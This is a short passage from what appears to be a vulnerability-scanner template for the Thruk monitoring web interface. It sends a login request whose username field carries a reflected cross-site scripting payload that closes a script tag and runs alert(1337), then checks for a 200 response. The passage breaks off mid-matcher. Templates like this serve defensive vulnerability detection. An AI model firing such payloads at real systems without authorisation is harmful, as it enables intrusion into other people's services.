        referer=%2Fthruk&login=--%3E%3C%2Fscript%3E%3Cscript%3Ealert%281337%29%3C%2Fscript%3E&password=Thruk+Monitoring+Webinterface
 
 matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
